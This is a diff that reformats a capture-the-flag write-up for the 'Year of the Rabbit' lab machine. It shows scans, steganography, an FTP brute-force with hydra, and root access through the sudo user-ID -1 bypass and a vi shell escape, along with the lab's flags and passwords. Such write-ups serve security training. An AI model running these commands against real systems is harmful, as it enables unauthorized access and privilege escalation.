@@ -1,6 +1,8 @@
-#### Scanning
+#### 1. Scanning
 
-nmap -Pn -A -T4 10.10.147.74                                          255 ⨯
+`nmap -Pn -A -T4 10.10.147.74`
+
+```                                          255 ⨯
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-01 13:42 EST
 Nmap scan report for 10.10.147.74
@@ -21,11 +23,17 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 40.94 seconds
+```
+
+There are 3 open ports: 21,22,80
 
 
-#### Gobuster
 
-gobuster dir -u 10.10.147.74 -w /usr/share/wordlists/dirb/common.txt -e php,txt,html
+#### 2. Gobuster
+
+`gobuster dir -u 10.10.147.74 -w /usr/share/wordlists/dirb/common.txt -e php,txt,html`
+
+```
 ===============================================================
 Gobuster v3.0.1
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
@@ -49,11 +57,13 @@ http://10.10.147.74/server-status (Status: 403)
 ===============================================================
 2021/02/01 13:44:54 Finished
 ===============================================================
+```
+
+The only interesting directory is `/assets`
 
 
 
-
-#### accessing /assets
+#### 3. Checking /assets
 
 I download a video and in the same time read `style.css` which contains a clue:
 
@@ -62,11 +72,12 @@ I download a video and in the same time read `style.css` which contains a clue:
      Take a look at the page: /sup3r_s3cr3t_fl4g.php
 ```
 
-#### Checking /sup3r_s3cr3t_fl4g.php
 
-I run burp and intercept a response with a link to hidden website:
+#### 4. Checking /sup3r_s3cr3t_fl4g.php
 
+I run burp and open the website to intercept a response with a link to hidden website:
 
+```
 GET /intermediary.php?hidden_directory=/WExYY2Cv-qU HTTP/1.1
 Host: 10.10.147.74
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
@@ -75,66 +86,64 @@ Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate
 Connection: close
 Upgrade-Insecure-Requests: 1
+```
+
+Additionally, ean rror message shows up while opening it and instructs to turn off javascript, so in Firefox:
+
+`about:config` ---> `javascript enabled` ---> I switched to false
+
+There is a modified youtube video which it turns out to be a rabbit hole.
 
 
-It is written to disable javascript in a browser so in Firefox:
 
-about:config ---> javvascript enabled ---> I switched to false
+##### 5. Checking hidden website.
 
-After checking a video it turns out to be a rabbit hole, however
+I go to:
 
-I go to
+`http://10.10.147.74/WExYY2Cv-qU/`
 
-http://10.10.147.74/WExYY2Cv-qU/
-
-which has some jpg inside
+which has a jpg file inside
 
 I download it and run couple of tools which give nothing: binwalk, steghide, exiftools.
 
-Finally zsteg gives something
+Finally zsteg finds a clue:
 
 ```
-Watch out for red output. This tool shows lots of false positives...
-[?] 1244 bytes of extra data after image end (IEND), offset = 0x73ae7
 extradata:0         .. text: "Ot9RrG7h2~24?\nEh, you've earned this. Username for FTP is ftpuser\nOne of these is the password
 ```
 
-#### Bruteforcing ftp
+
+#### 6. Bruteforcing ftp with hydra
 
 I have a username `ftpuser` to ftp so let's run hydra and bruteforce a password:
 
 `hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt 10.10.147.74 ftp`
 
-After a very long time hydra find the password `5iez1wGXKfPKQ`
+After a very long time hydra finds the password `5iez1wGXKfPKQ`
 
-I login to ftp and download `Eli's_Creds.txt`
 
+
+#### 7. FTP
+
+I login to ftp and download `Eli's_Creds.txt` to my machine:
+
+```
 ftp 10.10.147.74
-Connected to 10.10.147.74.
-220 (vsFTPd 3.0.2)
-Name (10.10.147.74:kali): ftpuser
-331 Please specify the password.
-Password:
-230 Login successful.
-Remote system type is UNIX.
-Using binary mode to transfer files.
+
 ftp> dir
 200 PORT command successful. Consider using PASV.
 150 Here comes the directory listing.
 -rw-r--r--    1 0        0             758 Jan 23  2020 Eli's_Creds.txt
-226 Directory send OK.
+
 ftp> get Eli's_Creds.txt
-local: Eli's_Creds.txt remote: Eli's_Creds.txt
-200 PORT command successful. Consider using PASV.
-150 Opening BINARY mode data connection for Eli's_Creds.txt (758 bytes).
-226 Transfer complete.
-758 bytes received in 0.00 secs (1.9432 MB/s)
+
 ftp> 
+```
 
-#### Checking txt file
 
-I cat a file and get some symbols:
+I cat it and see some symbols:
 
+```
 cat Eli\'s_Creds.txt 
 +++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->-
 --<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+
@@ -147,30 +156,33 @@ cat Eli\'s_Creds.txt
 ++++[ ->--- --<]> ---.< +++++ [->-- ---<] >---. <++++ ++++[ ->+++ +++++
 <]>++ ++++. <++++ +++[- >---- ---<] >---- -.+++ +.<++ +++++ [->++ +++++
 <]>+. <+++[ ->--- <]>-- ---.- ----. <
+```
 
-This is called Brainfuck. I access an online translator available here:
+This is called Brainfuck. There is an online decoder available here:
 
-https://www.splitbrain.org/_static/ook/
+`https://www.splitbrain.org/_static/ook/`
 
-and after decoding gett credentials:
+and after decoding I get credentials:
 
+```
 User: eli
 Password: DSpDiM1wAEwid
+```
 
-#### SSH as eli
+
+#### 8. SSH as eli
 
 Once I ssh there is a message:
 
-1 new message
+```
 Message from Root to Gwendoline:
 
 "Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"
 
 END MESSAGE
+```
 
-My first thought was to simply type `
-
-`locate s3cr3t`
+My first thought was to simply type `locate s3cr3t`
 
 and it seemed to work:
 
@@ -180,7 +192,7 @@ and it seemed to work:
 /var/www/html/sup3r_s3cr3t_fl4g.php
 ```
 
-After cat I get a password:
+Afterwards, I cat a file made for gwendoline and get her password:
 
 ```
 cat .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly\! 
@@ -191,15 +203,19 @@ Honestly!
 Yours sincerely
    -Root
 ```
-#### Switching to gwendoline
+
+
+#### 9. Switching to gwendoline
 
 I su to gwendoline and read user.txt
 
+```
 gwendoline@year-of-the-rabbit:~$ cat user.txt
 THM{1107174691af9ff3681d2b5bdb5740b1589bae53}
+```
 
 
-#### Escalate to root
+#### 10. Escalate to root
 
 I check sudo -l but there is nothing useful:
 
@@ -217,15 +233,9 @@ We can use sudo with any user except of root. However, there is a vulnerability 
 
 Briefly speaking, sudo reverts to user 0 (root) when we choose user -1 so:
 
-```
-
 `gwendoline@year-of-the-rabbit:~$ sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt`
 
 and then `:` and `!/bin/bash` which made me root:
-
-```
-
-Makes us root:
 
 ```
 root@year-of-the-rabbit:/home/gwendoline# cat /root/root.txt 
